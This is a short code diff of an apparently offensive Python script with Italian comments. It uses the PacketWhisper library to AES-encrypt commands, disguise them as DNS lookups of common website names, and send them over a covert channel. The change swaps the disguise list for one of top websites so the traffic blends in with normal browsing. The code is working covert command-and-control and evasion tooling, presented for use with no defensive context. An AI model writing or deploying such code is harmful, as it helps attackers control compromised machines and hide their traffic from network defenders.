@@ -6,6 +6,7 @@ from packetWhisper import CloakAndTransferFile, TransferCloakedFile
 
 # Chiave AES (16, 24 o 32 byte)
 key = b'TuaChiaveAES32byteQui__AESKeyExample'[:32]
+cipher = "ciphers\\common_fqdn\\topWebsites"
 
 def send_command(command):
     # Criptare il comando
@@ -15,7 +16,7 @@ def send_command(command):
     cloaked_command = "cloaked_command.txt"
     
     print("Cloaking command...")
-    Cloakify(encrypted_command, "ciphers\\repeated_unique_fqdn\\red_lectroids", cloaked_command)
+    Cloakify(encrypted_command, cipher, cloaked_command)
 
     print("Initializing command transfer")
     TransferCloakedFile("cloaked_command.txt", 0.0)
